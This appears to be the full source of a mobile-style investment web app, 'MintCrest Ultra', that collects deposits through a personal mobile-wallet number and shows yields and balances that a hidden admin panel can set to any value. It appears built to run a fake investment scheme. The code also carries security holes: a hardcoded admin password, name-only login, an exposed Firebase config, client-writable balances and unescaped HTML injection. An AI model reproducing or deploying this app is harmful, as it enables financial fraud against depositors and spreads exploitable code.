<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | Trusted Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0062ff 0%, #00d4ff 100%); }
        .grad-gold { background: linear-gradient(135deg, #ff930f 0%, #fff95b 100%); }
        .page { display: none; height: 100%; overflow-y: auto; padding-bottom: 120px; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; } }
        .nav-btn { filter: grayscale(1); opacity: 0.5; transition: 0.3s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; }
        .status-badge { font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
        .badge-pending { background: #fef3c7; color: #92400e; }
        .badge-approved { background: #dcfce7; color: #166534; }
        .badge-rejected { background: #fee2e2; color: #991b1b; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <h1 onclick="adminTap()" class="text-4xl font-black mb-8 italic tracking-tighter">MINTCREST</h1>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black uppercase text-xs">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 relative">
        
        <div id="p-home" class="page active-page p-6">
            <div class="grad-main p-8 rounded-[2.5rem] mb-6 shadow-2xl relative">
                <p class="text-[10px] font-black opacity-80 uppercase mb-1">Total Assets</p>
                <h2 class="text-4xl font-black" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-between items-center border-t border-white/5 pt-4">
                    <div><p class="text-[8px] opacity-70">PROFIT</p><p class="font-black" id="v-profit">₨ 0</p></div>
                    <div class="text-right"><p class="text-[8px] opacity-70 uppercase">Next Cycle</p><p id="timer" class="text-xs font-black text-cyan-200">23:59:59</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-6">
                <button id="btn-bonus" onclick="claimDailyBonus()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-yellow-500">🎁 Daily Bonus</button>
                <button onclick="applyPromo()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-cyan-500">🎟️ Promo Code</button>
            </div>

            <div class="glass p-5 rounded-[2rem] mb-6">
                <h3 class="text-[10px] font-black text-blue-400 mb-2 uppercase italic">Verified Protection</h3>
                <p class="text-[9px] opacity-60 leading-relaxed">MintCrest V16 uses secure nodes. 30-day cycles ensure liquidity. <span class="text-blue-400 underline" onclick="changePage('legal')">View Terms</span></p>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black uppercase text-cyan-400 mb-6 italic">Funding Terminal</h3>
            <div class="space-y-3 mb-6">
                <div onclick="selM('Easypaisa','03705519562')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer border border-white/5"><span>Easypaisa</span><span class="text-[9px] font-bold">0370...562</span></div>
                <div onclick="selM('JazzCash','0300XXXXXXX')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer border border-white/5"><span>JazzCash</span><span class="text-[9px] font-bold">0300...XXX</span></div>
                <div onclick="selM('Binance (USDT)','TRC20-ADDRESS')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer border border-white/5"><span>Binance</span><span class="text-[9px] font-bold text-yellow-500 uppercase">TRC20</span></div>
            </div>
            <div id="dep-box" class="hidden glass p-6 rounded-[2rem] animate-pulse">
                <p id="m-info" class="text-center text-[10px] font-black mb-4 text-cyan-400 uppercase"></p>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="d-tid" placeholder="TID / TRX Hash" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center uppercase outline-none border border-white/10">
                <input type="file" id="d-file" accept="image/*" class="w-full text-[10px] mb-4">
                <button onclick="subDep()" class="w-full grad-main py-4 rounded-2xl font-black text-[10px] uppercase">Verify Assets</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-rose-600">
                <h3 class="font-black text-rose-500 mb-6 uppercase">Withdrawal Node</h3>
                <input type="number" id="w-amt" placeholder="Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold">
                <input type="text" id="w-acc" placeholder="Account Title & No" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-xs font-bold">
                <button onclick="subWd()" class="w-full bg-rose-600 py-5 rounded-3xl font-black text-xs uppercase">Process Outflow</button>
            </div>
        </div>

        <div id="p-legal" class="page p-6">
            <div class="glass p-8 rounded-[3rem]">
                <h2 class="font-black text-blue-400 mb-4 uppercase">Integrity Policy</h2>
                <p class="text-[11px] opacity-70 mb-6 leading-relaxed">MintCrest is a global decentralized asset manager. To ensure market stability, all investment plans follow a strictly manual verification and 30-day locked cycle policy.</p>
                <button onclick="changePage('home')" class="text-[10px] font-black text-blue-400 underline uppercase">Go Back</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3 pb-10"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3 pb-10"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto p-6">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black text-cyan-400 italic">COMMAND NODE</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-6 py-1 rounded-lg text-[9px] font-black">EXIT</button>
        </div>
        <div class="grid grid-cols-2 gap-2 mb-8">
            <input type="text" id="adm-u" placeholder="Username" class="bg-white/5 p-3 rounded-xl text-xs outline-none">
            <input type="number" id="adm-v" placeholder="Value" class="bg-white/5 p-3 rounded-xl text-xs outline-none">
            <button onclick="editU('balance')" class="grad-main py-3 rounded-xl text-[8px] font-black">EDIT BAL</button>
            <button onclick="editU('profit')" class="grad-gold py-3 rounded-xl text-[8px] font-black">EDIT PROFIT</button>
        </div>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[3rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn text-2xl">📥</button>
    </nav>

    <script>
        // Sweetie, your updated Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0; let curM = '';

        // 25 Custom Plans starting at 200 (30 Days Cycle)
        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ 
                n: `Fleet ${i < 10 ? '0'+i : i} (30D)`, 
                p: 200 + (i-1)*500, 
                r: (1.5 + i*0.4).toFixed(1) 
            });
        }

        async function login() {
            const n = document.getElementById('user-name').value.trim(); if(!n) return;
            const ref = db.collection("users").doc(n); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: n, balance: 0, profit: 0, lastB: 0, lastP: 0 });
            user = (await ref.get()).data();
            startSync(n); document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); startTimer();
        }

        function startTimer() {
            setInterval(() => {
                const d = new Date();
                document.getElementById('timer').innerText = `${23-d.getHours()}:${59-d.getMinutes()}:${59-d.getSeconds()}`;
            }, 1000);
        }

        async function claimDailyBonus() {
            const now = Date.now();
            if(now - (user.lastB || 0) < 86400000) return alert("Wait 24h, sweetie! 😘");
            await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastB: now });
            alert("Request sent to Admin! 🎁");
        }

        async function applyPromo() {
            const code = prompt("Enter Promo Code:"); if(!code) return;
            const now = Date.now();
            if(now - (user.lastP || 0) < 86400000) return alert("Only one promo per day! 😘");
            await db.collection("requests").add({ user: user.name, type: "Promo: "+code, status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastP: now });
            alert("Promo request sent! 🎟️");
        }

        function selM(m, a) { curM = m; document.getElementById('dep-box').classList.remove('hidden'); document.getElementById('m-info').innerText = `Send to ${m}: ${a}`; }

        async function subDep() {
            const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(a < 200 || !t || !f) return alert("Complete all steps! (Min 200)");
            const sRef = storage.ref(`proofs/${Date.now()}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "Dep ("+curM+")", status: "pending", time: Date.now() });
            alert("Payment Logged! 😘"); location.reload();
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value; if(!a || a > user.balance) return alert("Low Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "Withdraw", status: "pending", time: Date.now() });
            alert("Request Logged!"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { user = d.data(); document.getElementById('v-bal').innerText = "₨ "+(user.balance||0); document.getElementById('v-profit').innerText = "₨ "+(user.profit||0); });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").limit(10).onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between text-[10px] uppercase font-bold"><span>${x.type}</span><span class="status-badge badge-${x.status}">${x.status}</span></div>`; });
            });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '<h3 class="font-black text-cyan-400 uppercase text-center mb-4 italic">30-Day Investment Cycle</h3>';
            plans.forEach(p => { l.innerHTML += `<div class="glass p-5 rounded-[1.5rem] flex justify-between items-center"><div class="text-left"><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-blue-400 font-bold">${p.r}% Yield</p></div><div class="font-black text-xs">₨ ${p.p}</div></div>`; });
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Auth Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function editU(f) { const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Success!"); }

        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-2xl"><p class="text-[10px] font-black">${x.user} | ${x.type}</p><p class="text-[8px] opacity-60 mb-3">Amt: ${x.amount || 0} | TID/Acc: ${x.tid || x.acc || 'N/A'}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-lg text-[9px] font-black mb-3 uppercase">Proof Image</a>` : ''}<div class="flex gap-2"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-2 rounded-lg text-[9px] font-black">APPROVE</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-2 rounded-lg text-[9px] font-black">REJECT</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type.includes("Bonus") || type.includes("Promo")) { const b = parseInt(prompt("Enter Reward:")); await ref.update({ balance: (d.data().balance||0) + b }); }
                else if(type.includes("Dep")) await ref.update({ balance: (d.data().balance||0) + amt });
            } else if(act==='rejected' && type === 'Withdraw') { await ref.update({ balance: (d.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
    </script>
</body>
</html>
